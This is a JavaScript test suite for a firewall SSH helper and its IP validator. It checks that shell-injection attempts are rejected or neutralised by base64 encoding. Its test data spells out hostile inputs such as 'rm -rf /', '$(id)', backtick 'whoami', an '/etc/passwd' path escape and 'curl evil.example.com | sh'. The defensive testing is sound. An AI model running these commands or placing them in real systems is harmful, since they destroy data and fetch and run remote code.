// Tests for ngfw-specific helpers: `validateNgfwIp` and
// `buildNgfwSshCommands`. The argv-array helpers (`buildAwsArgv`,
// `awsExec`, `awsJson`, `awsText`, `buildSsmSendCommandArgs`,
// `REGION`, `getProfile`) are canonically tested in
// `mcp/ops/lib.test.js` because both packages re-export them from
// `mcp/shared/aws-helpers.js`. Duplicating those test suites here
// would just shadow the canonical coverage.
//
// `mcp/ngfw/spawn-roundtrip.test.js` covers the spawnSync argv
// preservation guarantee end-to-end; `mcp/ngfw/script-execution.test.js`
// covers the EXIT-trap exit-code propagation under /bin/sh.

import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  buildNgfwSshCommands,
  validateNgfwIp,
} from "./lib.js";

// ---------------------------------------------------------------------------
// validateNgfwIp
// ---------------------------------------------------------------------------

describe("validateNgfwIp", () => {
  it("accepts valid dotted-quad IPv4 addresses", () => {
    for (const ip of ["10.0.0.1", "192.168.1.254", "172.16.0.0", "0.0.0.0", "255.255.255.255"]) {
      assert.equal(validateNgfwIp(ip), ip);
    }
  });

  it("rejects octets outside 0-255", () => {
    for (const ip of ["256.0.0.1", "1.2.3.300", "999.0.0.0"]) {
      assert.throws(() => validateNgfwIp(ip), /Invalid NGFW IPv4 address/);
    }
  });

  it("rejects malformed strings", () => {
    for (const bad of [
      "",
      "not-an-ip",
      "10.0.0",
      "10.0.0.1.5",
      "10.0.0.01a",
      " 10.0.0.1",
      "10.0.0.1 ",
    ]) {
      assert.throws(() => validateNgfwIp(bad), /Invalid NGFW IPv4 address/);
    }
  });

  it("rejects shell metacharacters embedded in the address", () => {
    for (const evil of [
      "10.0.0.1; rm -rf /",
      "10.0.0.1$(id)",
      "10.0.0.1`whoami`",
      "10.0.0.1 admin@evil.example.com",
      "10.0.0.1\nmalicious",
    ]) {
      assert.throws(() => validateNgfwIp(evil), /Invalid NGFW IPv4 address/);
    }
  });

  it("throws TypeError for non-string input", () => {
    for (const bad of [null, undefined, 12345, {}, []]) {
      assert.throws(() => validateNgfwIp(bad), TypeError);
    }
  });
});

// ---------------------------------------------------------------------------
// buildNgfwSshCommands (issue #759 — remote shell boundary)
// ---------------------------------------------------------------------------

function decodeEncodedCommand(commands) {
  // The ssh pipeline is the last line: `printf %s '<base64>' | base64 -d | ssh ...`
  const pipeline = commands.at(-1);
  const match = /^printf %s '([A-Za-z0-9+/=]*)' \| base64 -d \| ssh /.exec(pipeline);
  if (!match) {
    throw new Error(`pipeline line did not match expected shape: ${pipeline}`);
  }
  return Buffer.from(match[1], "base64").toString("utf-8");
}

// PAN-OS CLI is line-oriented; buildNgfwSshCommands appends a trailing
// newline to the command bytes before encoding so the appliance
// receives a complete line. Round-trip tests strip that newline before
// comparing against the caller-supplied command.
function decodedWithoutTrailingNewline(commands) {
  const decoded = decodeEncodedCommand(commands);
  return decoded.endsWith("\n") ? decoded.slice(0, -1) : decoded;
}

const KEY_PATH_RE = /^\/tmp\/ngfw-[A-Za-z0-9._-]+\.pem$/;

describe("buildNgfwSshCommands", () => {
  // Fake placeholder key. Header text is intentionally non-standard so
  // the detect-private-key pre-commit hook does not match it. The
  // helper only treats this as opaque heredoc content.
  const sshKey = "FAKE-TEST-KEY-MATERIAL\nopaque-bytes\nFAKE-TEST-KEY-END\n";
  const ngfwIp = "10.0.0.5";

  it("returns the expected shell script with a per-invocation key path and exit-code-preserving cleanup", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
    assert.equal(cmds.length, 7);
    assert.equal(cmds[0], `set -e`);
    // The EXIT trap is installed BEFORE the cat that creates the key
    // file, so a failure during cat/chmod cannot leave the key
    // behind on disk.
    const trapMatch = /^trap 'rc=\$\?; rm -f (\/tmp\/ngfw-[A-Za-z0-9._-]+\.pem); exit \$rc' EXIT$/.exec(cmds[1]);
    assert.ok(trapMatch, `trap line shape: ${cmds[1]}`);
    const path = trapMatch[1];
    assert.match(path, KEY_PATH_RE);
    assert.equal(cmds[2], `cat > ${path} << 'EOFKEY'`);
    assert.equal(cmds[3], sshKey);
    assert.equal(cmds[4], `EOFKEY`);
    assert.equal(cmds[5], `chmod 600 ${path}`);
    // The ssh pipeline is the LAST command so its exit code
    // propagates to SSM (set -e + trap).
    const sshLine = cmds[6];
    assert.ok(sshLine.startsWith("printf %s '"));
    assert.ok(sshLine.includes(`' | base64 -d | ssh -i ${path} `));
    const printfMatch = /^printf %s '([A-Za-z0-9+/=]+)'/.exec(sshLine);
    assert.ok(printfMatch, "printf segment must contain only base64 characters");
  });

  it("uses a unique key path per invocation so concurrent calls do not clobber each other", () => {
    const a = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const b = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const pathA = /rm -f (\S+);/.exec(a[1])[1];
    const pathB = /rm -f (\S+);/.exec(b[1])[1];
    assert.notEqual(pathA, pathB);
  });

  it("accepts an explicit keyPath when caller supplies one", () => {
    const cmds = buildNgfwSshCommands({
      sshKey,
      ngfwIp,
      command: "show",
      keyPath: "/tmp/ngfw-fixed.pem",
    });
    assert.equal(cmds[1], "trap 'rc=$?; rm -f /tmp/ngfw-fixed.pem; exit $rc' EXIT");
    assert.equal(cmds[2], "cat > /tmp/ngfw-fixed.pem << 'EOFKEY'");
    assert.equal(cmds[5], "chmod 600 /tmp/ngfw-fixed.pem");
  });

  it("installs the EXIT trap BEFORE the file-creating commands", () => {
    // Without this ordering, a failure in cat/chmod would exit (via
    // set -e) before the trap was registered, leaking the key file.
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const trapIdx = cmds.findIndex((c) => c.startsWith("trap "));
    const catIdx = cmds.findIndex((c) => c.startsWith("cat > "));
    const chmodIdx = cmds.findIndex((c) => c.startsWith("chmod "));
    assert.ok(trapIdx >= 0 && catIdx >= 0 && chmodIdx >= 0, "missing required commands");
    assert.ok(trapIdx < catIdx, "trap must come before cat");
    assert.ok(trapIdx < chmodIdx, "trap must come before chmod");
  });

  it("preserves the SSH exit code through cleanup", () => {
    // The EXIT trap captures $? before the rm so a PAN-OS / SSH
    // failure surfaces as the script's exit code instead of being
    // masked by the cleanup command's status.
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show" });
    const trapLine = cmds.find((c) => c.startsWith("trap "));
    assert.ok(trapLine, "missing EXIT trap");
    assert.match(trapLine, /^trap 'rc=\$\?; rm -f \S+; exit \$rc' EXIT$/);
    // set -e ensures non-zero from any command short-circuits the
    // script so the trap captures the failing exit code, not the
    // status of any subsequent line.
    assert.equal(cmds[0], "set -e");
  });

  it("rejects a keyPath that escapes the /tmp/ngfw- prefix or contains shell metacharacters", () => {
    for (const bad of [
      "/etc/passwd",
      "/tmp/other.pem",
      "/tmp/ngfw-../etc/passwd",
      "/tmp/ngfw-$(id).pem",
      "/tmp/ngfw-`whoami`.pem",
      "/tmp/ngfw-; rm -rf /.pem",
      "/tmp/ngfw-with space.pem",
    ]) {
      assert.throws(
        () => buildNgfwSshCommands({ sshKey, ngfwIp, command: "show", keyPath: bad }),
        /Invalid keyPath/,
        `expected rejection for: ${bad}`
      );
    }
  });

  it("uses a single-quoted heredoc terminator so the SSH key is not expanded", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
    // 'EOFKEY' (single-quoted) tells the shell not to expand $vars, $(), or backticks
    // inside the heredoc body. Plain EOFKEY would expand them.
    const catLine = cmds.find((c) => c.startsWith("cat > "));
    assert.ok(catLine, "missing cat line");
    assert.match(catLine, /^cat > \/tmp\/ngfw-[A-Za-z0-9._-]+\.pem << 'EOFKEY'$/);
  });

  it("appends a trailing newline so PAN-OS receives a complete line", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info" });
    const decoded = decodeEncodedCommand(cmds);
    assert.equal(decoded, "show system info\n");
  });

  it("does not double-append a newline when the caller already supplied one", () => {
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command: "show system info\n" });
    const decoded = decodeEncodedCommand(cmds);
    assert.equal(decoded, "show system info\n");
    assert.ok(!decoded.endsWith("\n\n"));
  });

  it("base64-round-trips PAN-OS commands containing every shell metacharacter shape", () => {
    // Combined coverage for $(), backticks, single+double quotes,
    // semicolons, pipes, ampersands, newlines, and the heredoc
    // terminator. The portal shell never sees the literal payload —
    // that is the whole point of the base64 transport.
    const cases = [
      "show interface all",
      "$(rm -rf /)",
      "`id`",
      `'; touch /tmp/pwn; echo "evil"`,
      "show config; rm -rf / && curl evil.example.com | sh\nshow system info",
      "show interface all\nEOFKEY\nrm -rf /",
    ];
    for (const command of cases) {
      const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
      assert.equal(decodedWithoutTrailingNewline(cmds), command, `round-trip failed for: ${command}`);
    }
  });

  it("never includes the raw command string anywhere in the shell command list", () => {
    const command = "$(whoami) && touch /tmp/pwn";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    const joined = cmds.join("\n");
    assert.ok(!joined.includes("$(whoami)"), "raw $() leaked into shell payload");
    assert.ok(!joined.includes("touch /tmp/pwn"), "raw touch leaked into shell payload");
  });

  it("keeps the encoded base64 character set shell-safe inside single quotes", () => {
    const command = "$(curl evil.example.com)";
    const cmds = buildNgfwSshCommands({ sshKey, ngfwIp, command });
    const sshLine = cmds.at(-1);
    const m = /^printf %s '([^']*)'/.exec(sshLine);
    assert.ok(m, "printf line did not parse");
    assert.match(m[1], /^[A-Za-z0-9+/=]+$/);
    assert.ok(!m[1].includes("'"));
  });

  it("rejects a malformed ngfwIp via validateNgfwIp", () => {
    assert.throws(
      () => buildNgfwSshCommands({ sshKey, ngfwIp: "10.0.0.1; rm -rf /", command: "show" }),
      /Invalid NGFW IPv4 address/
    );
  });

  it("rejects empty sshKey and non-string command", () => {
    assert.throws(
      () => buildNgfwSshCommands({ sshKey: "", ngfwIp, command: "show" }),
      TypeError
    );
    assert.throws(
      () => buildNgfwSshCommands({ sshKey, ngfwIp, command: null }),
      TypeError
    );
    assert.throws(
      () => buildNgfwSshCommands({ sshKey, ngfwIp, command: 42 }),
      TypeError
    );
  });
});
